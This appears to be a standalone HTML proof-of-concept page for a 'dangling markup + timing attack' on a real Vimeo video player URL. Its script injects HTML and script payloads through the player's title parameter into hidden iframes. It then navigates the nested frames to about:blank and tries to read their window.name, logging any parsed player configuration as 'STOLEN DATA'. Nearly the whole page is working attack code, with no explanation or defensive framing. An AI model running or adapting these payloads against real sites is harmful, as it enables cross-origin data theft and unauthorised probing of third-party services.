<!DOCTYPE html>
<html>
<body>
    <h1>Dangling Markup + Timing Attack</h1>
    <div id="log"></div>

    <script>
        function log(msg) {
            document.getElementById('log').innerHTML += `<p>${msg}</p>`;
            console.log(msg);
        }

        // Step 1: Try to inject via query parameter
        const injectionPayloads = [
            // Try to create an iframe with a name that contains script
            '"><iframe name="<script>window.name=JSON.stringify(window.playerConfig)<script>">',
            
            // Try to inject into title
            '"><iframe name="steal">',
            
            // Try data URI
            'data:text/html,<iframe name="steal">',
        ];

        injectionPayloads.forEach((payload, i) => {
            const url = `https://player.vimeo.com/video/935884964?title=${encodeURIComponent(payload)}`;
            log(`Testing payload ${i}: ${payload}`);
            
            const iframe = document.createElement('iframe');
            iframe.src = url;
            iframe.style.display = 'none';
            iframe.name = `test${i}`;
            document.body.appendChild(iframe);
            
            setTimeout(() => {
                const win = iframe.contentWindow;
                
                // Try to access nested frames
                try {
                    if (win.length > 0) {
                        log(`âœ… Payload ${i} created ${win.length} nested frames`);
                        
                        for (let j = 0; j < win.length; j++) {
                            try {
                                // Try dangling attack
                                win[j].location = 'about:blank';
                                
                                setTimeout(() => {
                                    try {
                                        const name = win[j].name;
                                        log(`Frame ${j} name: ${name}`);
                                        
                                        // Try to parse as JSON
                                        if (name) {
                                            try {
                                                const data = JSON.parse(name);
                                                log(`ðŸš¨ STOLEN DATA: ${JSON.stringify(data)}`);
                                            } catch {}
                                        }
                                    } catch(e) {
                                        log(`Cannot read frame ${j}: ${e.message}`);
                                    }
                                }, 1000);
                                
                            } catch(e) {
                                log(`Cannot modify frame ${j}: ${e.message}`);
                            }
                        }
                    }
                } catch(e) {
                    log(`Payload ${i} error: ${e.message}`);
                }
            }, 3000);
        });
    </script>
</body>
</html>
                            
